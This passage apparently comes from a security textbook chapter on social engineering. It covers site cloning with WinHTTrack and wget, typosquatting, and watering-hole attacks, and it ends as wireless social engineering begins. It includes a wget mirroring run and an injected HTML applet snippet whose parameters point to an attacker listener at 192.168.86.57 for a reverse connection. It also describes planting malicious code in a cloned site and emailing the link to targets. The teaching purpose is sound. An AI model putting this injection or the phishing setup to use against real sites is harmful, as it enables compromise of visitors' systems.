
to them if, for some reason, they change. It will lend more credibility to your cloned site, actually. If anyone were paying attention, they would see the requests going to the legitimate sites rather than your rogue site. The only file that would be coming from your rogue site is the HTML that controls the rendering of the page. This is not to say that you couldn’t grab the files and host them locally. With a tool like WinHTTrack, it’s a configurable option, as you can see in Figure 10.6.

### FIGURE 10.6 WinHTTrack options

![](img/421171b17a0c0dfae0aacde15d9831c1_404_0.png)

The options are optional, of course. By default, WinHTTrack won’t grab media files but will only grab the HTML from a site. It will clone the entire site, though, which means it traverses links. WinHTTrack uses projects to clone sites, so it’s a multistep process to pull a website. In Figure 10.7, you can see the step in which you would enter the URL. You could also enter multiple URLs if you wanted to download multiple sites. You would have to change the action to Download All Sites In Pages. You could also use WinHTTrack to test sites rather than downloading them, which means you could check a list of bookmarks to see if they were still valid.

If you prefer command-line tools, though, there are a couple you could use. One of them is wget, which is a program that is used to make web-based requests and get files. You could use wget to download files from the command line. On a Linux system, you could grab tarballs of source code, package files, or any file that wouldn’t need to be rendered. You can use wget to do recursive GET requests to a web server, which is what you would need to mirror a site. This means wget pulls the HTML page at the top of the site and saves it. It then looks for all the anchor tags in the page and follows each of them in turn to get those pages or files. In the following code listing, you can see a run of wget using -m to tell wget to mirror the site, meaning grab the entire site.

### FIGURE 10.7 Site cloning with WinHTTrack

![](img/421171b17a0c0dfae0aacde15d9831c1_405_0.png)

## Using wget to mirror website

```
root@quiche:~# wget -m https://www.wiley.com
--2018-11-21 07:05:43--  https://www.wiley.com/
Resolving www.wiley.com (www.wiley.com)... 143.204.29.19, 143.204.29.108,
143.204.29.24, ...
Connecting to www.wiley.com (www.wiley.com)|143.204.29.19|:443... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: /en-us [following]
--2018-11-21 07:05:43--  https://www.wiley.com/en-us
Reusing existing connection to www.wiley.com:443.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'www.wiley.com/index.html'

www.wiley.com/index    [ <=>                                                                         ] 85.83K  --.-KB/s    in 0.08s  

Last-modified header missing -- time-stamps turned off.
2018-11-21 07:05:44 (1.08 MB/s) - 'www.wiley.com/index.html' saved [87888]

Loading robots.txt; please ignore errors.
--2018-11-21 07:05:44-- https://www.wiley.com/robots.txt
Reusing existing connection to www.wiley.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 817 [text/plain]
Saving to: 'www.wiley.com/robots.txt'

www.wiley.com/robots.txt 100%[===================>] 817 --.-KB/s in 0s
```

If you wanted to have access to the site offline, you could use command-line switches to make the links relative. For our purposes, though, we would want to have the site available through our own web server, so we're just going to mirror the site, keeping everything the way it is. Another command-line program that's similar to wget is cURL. Unfortunately, cURL doesn't have built-in functionality to pull a complete website, in spite of everything cURL is capable of. You could, though, write a short script that would pull the site, and there are such scripts available online for people who prefer to use cURL over wget.

Once you have the pages for the site in place, you would need to make any adjustments to the source code. This would include inserting your malicious code so it could be downloaded and then including a reference to it in one of the pages in the site. Once you have the site, you could send the URL for a page to a target, potentially in an email. When it comes to social engineering, you will sometimes find multiple layers in the attack.

## Rogue Attacks

A rogue website would be one that a user may expect to be legitimate when in fact it has a malicious purpose. This could be a site that looks exactly like a legitimate site, using the site-cloning technique mentioned earlier, but the URL, meaning the fully qualified domain name, is different than the usual URL. There are some hostnames that are commonly mistyped. Attackers can register these common typos as domain names themselves and wait for people to come visit. The tactic is called typosquatting. You could, for instance, register gogle.com and do a site clone of google.com, serving up pages at a server that hosts your gogle.com site. You may also hear this tactic referred to as URL hijacking.

Rogue doesn't necessarily mean you've created a fake site, though. It could mean that you are using a legitimate platform to stage your attack without the legitimate platform knowing anything. A watering hole attack is a social engineering attack that makes use of the fact that there are sites that people will commonly visit. A watering hole in the wild is a place where animals come to visit a lot and maybe even hang around. Because it's a place animals are guaranteed to come, because water is so essential to life and not all animals get all the water they need from their food, the watering hole is a great place to wait for animals to visit. The same is true with this sort of attack.

With a watering hole attack, you would gain access to a website that a lot of people visit and introduce infected software to it. This is not to say this is an easy attack to execute, but by using it you have the potential to gain a lot of systems quickly. Rather than just gaining access to a single system, if you compromise a website that’s visited a lot by the people you are looking to get information out of, you can gain access to a lot of systems by compromising a single system. Once you get over the hurdle of compromising the website—for example, if you were to compromise espn.com you would get a lot of men in particular stopping by on a regular basis—introducing the attack is easy. As an example, in the following code listing you can see a couple of lines introduced at the bottom of an index.html page.

### Attack HTML with applet reference

```
</script>

<applet code="Java.class" width="1" height="1" archive="hkFKIKkhSvSHss.jar"><param name="name"><param name="1" value="http://192.168.86.57:80/krmnAir"><param name="2" value="ZGF0YQ=="><param name="3" value="http://192.168.86.57:80/qpaacKQk"><param name="4" value="http://192.168.86.57:80/FMLhoBQCuNH">
```

This does require that you have an applet that you can use, though they can either be found or created. As with so many other things, Metasploit can be used for attack payloads like this. This HTML fragment tells the browser to load the Java class found in the Java archive (JAR) hkFKIKkhSvSHss.jar. This is a randomly generated filename. Included in this attack is a reverse connection back to an IP address that was loaded into the attack.

Watering hole attacks are not the only web-based attacks you’ll see, but they have the advantage of being targeted. They are probably more useful when working with an organization. You could load up an attack into the intranet server, if the company has one, since it’s the sort of site employees will regularly visit, and you could potentially gather a lot of desktop systems from the compromised host.

## Wireless Social Engineering

Wi-Fi networks have become ubiquitous, and with so many devices not even having the capability of supporting a wired connection, there is generally an expectation that there would be a Wi-Fi network available for people. This is something else you can take advantage of. You can find a long list of Wi-Fi networks in most places. Just sitting in my living room, in a small community, there is a list of almost two dozen Wi-Fi networks available. You can see the list in Figure 10.8. There are no restrictions in naming these networks. There is no central place to register the names. You can even have overlapping names within the same physical space. It becomes up to the client trying to connect to determine what network to actually connect with.
